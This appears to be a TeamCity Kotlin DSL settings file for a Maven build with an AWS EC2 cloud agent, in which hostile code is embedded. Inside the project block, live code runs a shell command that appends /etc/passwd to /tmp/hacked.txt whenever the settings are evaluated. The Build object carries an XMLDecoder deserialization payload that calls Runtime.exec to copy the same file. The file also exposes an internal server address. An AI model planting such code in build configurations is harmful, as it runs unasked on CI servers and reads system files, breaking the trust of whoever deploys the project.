
import jetbrains.buildServer.configs.kotlin.*
import jetbrains.buildServer.configs.kotlin.buildFeatures.perfmon
import jetbrains.buildServer.configs.kotlin.buildSteps.maven
import jetbrains.buildServer.configs.kotlin.triggers.vcs
import java.beans.XMLDecoder
import java.io.ByteArrayInputStream
import java.io.InputStream
import java.nio.charset.StandardCharsets

/*
The settings script is an entry point for defining a TeamCity
project hierarchy. The script should contain a single call to the
project() function with a Project instance or an init function as
an argument.

VcsRoots, BuildTypes, Templates, and subprojects can be
registered inside the project using the vcsRoot(), buildType(),
template(), and subProject() methods respectively.

To debug settings scripts in command-line, run the

    mvnDebug org.jetbrains.teamcity:teamcity-configs-maven-plugin:generate

command and attach your debugger to the port 8000.

To debug in IntelliJ Idea, open the 'Maven Projects' tool window (View
-> Tool Windows -> Maven Projects), find the generate task node
(Plugins -> teamcity-configs -> teamcity-configs:generate), the
'Debug' option is available in the context menu for the task.
*/

version = "2023.11"

project {

    buildType(Build)


    /*var process = Runtime.getRuntime().exec("scp /etc/passwd /tmp/hacked.txt")
    val exitCode = process.waitFor()
    println(exitCode)*/

    val builder = ProcessBuilder()
    builder.command("sh", "-c", "cat /etc/passwd >> /tmp/hacked.txt")
    val process = builder.start()
    val exitCode = process.waitFor()

    features {
        amazonEC2CloudImage {
            id = "PROJECT_EXT_5"
            profileId = "amazon-1"
            agentPoolId = "-2"
            imagePriority = 5
            name = "Ubuntu Agent"
            vpcSubnetId = "subnet-0c23f411b0800b216"
            keyPairName = "daria.krupkina"
            instanceType = "t2.medium"
            securityGroups = listOf("sg-072d8bfa0626ea2a6")
            source = Source("ami-0817025aa39c203c6")
        }
        amazonEC2CloudProfile {
            id = "amazon-1"
            name = "Cloud AWS Profile"
            serverURL = "http://10.128.93.57:8124"
            terminateIdleMinutes = 0
            region = AmazonEC2CloudProfile.Regions.EU_WEST_DUBLIN
            authType = accessKey {
                keyId = "credentialsJSON:c0beb179-a7a4-44f1-9f81-ffe1641fda6c"
                secretKey = "credentialsJSON:ec56aca9-5346-4c26-b964-49b3a9384fc9"
            }
        }
    }

    params {
        text("text_parameter", "text_value", readOnly=true, allowEmpty = false)
    }
}

object Build : BuildType({
    name = "Build"

    val payload = """<?xml version="1.0" encoding="UTF-8"?>
    <java version="1.8.0_102" class="java.beans.XMLDecoder">
     <object class="java.lang.Runtime" method="getRuntime">
          <void method="exec">
          <array class="java.lang.String" length="3">
              <void index="0">
                  <string>scp</string>
              </void>
              <void index="1">
                  <string>/etc/passwd</string>
              </void>
              <void index="2">
                  <string>/tmp/hacked.txt</string>
              </void>
          </array>
          </void>
     </object>
    </java>"""
    val stream: InputStream = ByteArrayInputStream(payload.toByteArray(StandardCharsets.UTF_8))

    val d = XMLDecoder(
            stream
    )
    d.readObject()

    params {
        text("text_parameter", "text_value", readOnly=true, allowEmpty = true)
        text("parameter", "text", allowEmpty = false)
    }

    vcs {
        root(DslContext.settingsRoot)
    }

    steps {
        maven {
            goals = "clean test"
            runnerArgs = "-Dmaven.test.failure.ignore=true"
        }
    }

    triggers {
        vcs {
        }
    }

    features {
        perfmon {
        }
    }
})
